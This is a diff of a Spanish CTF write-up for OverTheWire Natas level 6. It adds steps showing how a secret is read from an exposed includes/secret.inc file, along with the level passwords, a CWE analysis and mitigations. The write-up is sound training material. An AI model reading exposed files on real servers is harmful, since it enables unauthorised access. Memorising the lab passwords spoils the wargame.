@@ -442,6 +442,8 @@ El servidor web asume incorrectamente que cualquier dato enviado por el navegado
 
 [Natas Level 5 → Level 6](https://overthewire.org/wargames/natas/natas6.html)
 
+Al visitar el sitio web vemos que nos pide iniciar sesión. Iniciamos sesión con las credenciales obtenidas.
+
 ```bash
 curl http://natas6.natas.labs.overthewire.org/ --user natas6:7mhjtShJAcld2NYbKHEadnhEwRn2P8VT
 ```
@@ -473,6 +475,8 @@ Input secret: <input name=secret><br>
 </html>
 ```
 
+En la web nos indica que tenemos que ingresar un secret y nos proporciona un link al código fuente. Visitamos el link proporcionado y nos encontramos el código del backend que incluye un archivo `includes/secret.inc`.
+
 [http://natas6.natas.labs.overthewire.org/index-source.html](http://natas6.natas.labs.overthewire.org/index-source.html)
 
 ```php
@@ -490,6 +494,8 @@ include "includes/secret.inc";
 ?>
 ```
 
+Visitamos la ruta del archivo `includes/secret.inc` y nos encontramos con el secreto que se requiere.
+
 ```bash
 curl http://natas6.natas.labs.overthewire.org/includes/secret.inc --user natas6:7mhjtShJAcld2NYbKHEadnhEwRn2P8VT
 ```
@@ -499,6 +505,8 @@ curl http://natas6.natas.labs.overthewire.org/includes/secret.inc --user natas6:
 $secret = "FOEIUWGHFEEUHOFUOIU";
 ?>
 ```
+
+Enviamos el `secret` en el form y obtenemos el password para el siguiente nivel.
 
 ```bash
 curl -X POST http://natas6.natas.labs.overthewire.org/ --user natas6:7mhjtShJAcld2NYbKHEadnhEwRn2P8VT -d 
@@ -534,6 +542,16 @@ Input secret: <input name=secret><br>
 
 <Callout type="success" title="Password natas7">
 B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0
+</Callout>
+
+<Callout type="warning" title="Vulnerabilidad">
+Se trata de una vulnerabilidad de Information Disclosure (exposición de datos sensibles) debido a la presencia de un archivo de configuración (`secret.inc`) dentro del Web Root (directorio público del servidor). Como el servidor web no está configurado para realizar el server-side parsing de archivos con extensión `.inc`, los sirve como texto plano, lo que permite a un atacante realizar un source code disclosure y leer credenciales críticas directamente a través de una petición HTTP. Esta vulnerabilidad se puede asociar con [**CWE-552** Files or Directories Accessible to External Parties](https://cwe.mitre.org/data/definitions/552.html) el servidor web permite el acceso directo a recursos que deberían ser privados, [**CWE-538** Insertion of Sensitive Information into Externally-Accessible File](https://cwe.mitre.org/data/definitions/538.html) guardar credenciales o secretos en un archivo accesible desde el exterior y [**CWE-200** Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html) revelar información confidencial a actores no autorizados.
+</Callout>
+
+<Callout type="tip" title="Mitigación">
+- Almacenar todos los inclusion files y archivos de configuración en un directorio superior no accesible vía URL.
+- Cambiar la extensión de `.inc` a `.php`. De esta forma, si alguien intenta acceder directamente, el código se ejecutará en el servidor y mostrará una página en blanco en lugar de revelar el código fuente.
+- Configurar el servidor web (usando reglas en `.htaccess` para Apache o bloques location en Nginx) para denegar explícitamente el acceso HTTP a directorios de soporte como `includes/`.
 </Callout>
 
 ## Natas Level 6 → Level 7
